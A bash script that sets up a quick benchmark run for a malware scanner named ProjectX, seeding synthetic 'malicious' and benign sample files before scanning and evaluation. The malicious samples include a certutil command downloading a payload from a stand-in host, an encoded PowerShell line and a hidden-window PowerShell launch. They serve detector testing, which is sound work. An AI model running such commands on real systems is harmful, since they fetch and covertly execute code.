#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "${ROOT_DIR}/.." && pwd)"
PYTHON_BIN="${PYTHON_BIN:-${PROJECT_ROOT}/.venv/bin/python3}"
if [[ ! -x "${PYTHON_BIN}" ]]; then
  PYTHON_BIN="python3"
fi

if [[ "$(uname -s)" != "Linux" ]]; then
  echo "raw_benchmark/run_quick_test.sh must run inside the Linux guest." >&2
  exit 1
fi

CONFIG_PATH="${ROOT_DIR}/benchmark_config.quick.json"

echo "Preparing quick-test benchmark inputs."

"${PYTHON_BIN}" - <<'PY'
import json
from pathlib import Path

root = Path("raw_benchmark")
base_cfg = json.loads((root / "benchmark_config.json").read_text())
workspace = Path(base_cfg["workspace_root"])
incoming = workspace / "incoming_malicious"
clean_seed = workspace / "quick_test_clean_seed"

incoming.mkdir(parents=True, exist_ok=True)
clean_seed.mkdir(parents=True, exist_ok=True)

for path in incoming.glob("quick_malicious_*"):
    path.unlink()
for path in clean_seed.glob("quick_clean_*"):
    path.unlink()

malicious_templates = [
    "@echo off\npowershell -enc ZQBjAGgAbwAgAHMAYQBmAGUALQBxAHUAaQBjAGsALQB0AGUAcwB0AA==\n",
    "cmd.exe /c certutil -urlcache -split -f http://example.invalid/payload.bin payload.bin\n",
    "wscript shell.run \"powershell -nop -w hidden -c Write-Host quick-test\"\n",
    "MZ quick test placeholder with suspicious strings CreateRemoteThread VirtualAlloc\n",
]
clean_templates = [
    "This is a harmless text configuration file for ProjectX quick test.\n",
    "{\"name\": \"projectx-quick-test\", \"status\": \"benign\"}\n",
    "<html><body><h1>Quick Test</h1><p>Safe benign content.</p></body></html>\n",
    "#!/bin/sh\necho quick test benign script\n",
]

for index in range(10):
    malicious_path = incoming / f"quick_malicious_{index:02d}.txt"
    malicious_path.write_text(malicious_templates[index % len(malicious_templates)])
    clean_path = clean_seed / f"quick_clean_{index:02d}.txt"
    clean_path.write_text(clean_templates[index % len(clean_templates)])

quick_cfg = dict(base_cfg)
quick_root = workspace / "quick_test"
quick_cfg["malicious_dir"] = str(quick_root / "malicious")
quick_cfg["clean_dir"] = str(quick_root / "clean")
quick_cfg["manifests_dir"] = str(quick_root / "manifests")
quick_cfg["results_dir"] = str(quick_root / "results")
quick_cfg["max_malicious_files"] = 10
quick_cfg["max_clean_files"] = 10
quick_cfg["concurrency"] = 1
quick_cfg["batch_size"] = 4
quick_cfg["malicious_sources"] = [
    {
        "name": "quick_guest_synthetic",
        "type": "guest_local",
        "path": str(incoming),
    }
]
quick_cfg["clean_sources"] = [
    {
        "name": "quick_clean_seed",
        "type": "filesystem",
        "paths": [str(clean_seed)],
    }
]
(root / "benchmark_config.quick.json").write_text(json.dumps(quick_cfg, indent=2) + "\n")
print(root / "benchmark_config.quick.json")
PY

if [[ ! -x "/opt/projectx_benchmark/bin/ProjectX" ]]; then
  echo "ProjectX guest binary missing, running guest setup first."
  bash "${ROOT_DIR}/setup_guest_env.sh"
fi

"${PYTHON_BIN}" "${ROOT_DIR}/download_malicious_corpus.py" --config "${CONFIG_PATH}"
"${PYTHON_BIN}" "${ROOT_DIR}/build_clean_corpus.py" --config "${CONFIG_PATH}"
"${PYTHON_BIN}" "${ROOT_DIR}/run_scans.py" --config "${CONFIG_PATH}"
"${PYTHON_BIN}" "${ROOT_DIR}/evaluate_results.py" --config "${CONFIG_PATH}"
"${PYTHON_BIN}" "${ROOT_DIR}/next_steps.py" --config "${CONFIG_PATH}"

PUBLISHED_DIR="$("${PYTHON_BIN}" - <<'PY'
from pathlib import Path
from raw_benchmark.common import load_config, publish_safe_artifacts
cfg = load_config(Path("raw_benchmark/benchmark_config.quick.json"))
print(publish_safe_artifacts(Path(cfg["results_dir"]) / "latest", cfg))
PY
)"

echo "Quick test complete."
echo "Published safe artifacts: ${PUBLISHED_DIR}"
